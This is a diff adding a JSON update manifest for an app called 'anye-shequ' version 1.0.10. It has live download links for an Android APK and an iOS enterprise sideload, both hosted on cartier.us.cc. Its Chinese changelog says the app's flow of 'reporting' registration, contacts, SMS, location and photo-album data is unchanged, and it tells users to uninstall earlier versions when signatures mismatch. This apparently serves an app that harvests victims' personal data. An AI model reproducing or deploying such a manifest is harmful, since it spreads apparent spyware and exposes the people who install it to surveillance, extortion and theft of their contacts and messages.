@@ -1,0 +1,6 @@
+{
+  "version": "1.0.10",
+  "update_log": "1. 更换为厂商最新原版安装包\n2. 注册/通讯录/短信/定位/相册 上报流程不变\n3. 若提示「应用未安装/签名不一致」，请先卸载旧版再安装",
+  "android": { "name": "anye-shequ-1.0.10.apk", "size": "19.44 MB", "url": "https://cartier.us.cc/dl/anye-shequ-1.0.10.apk" },
+  "ios": { "name": "lBL002bUh015_Completed.ipa", "size": "8.01 MB", "url": "itms-services://?action=download-manifest&url=https://cartier.us.cc/dl/manifest.plist" }
+}
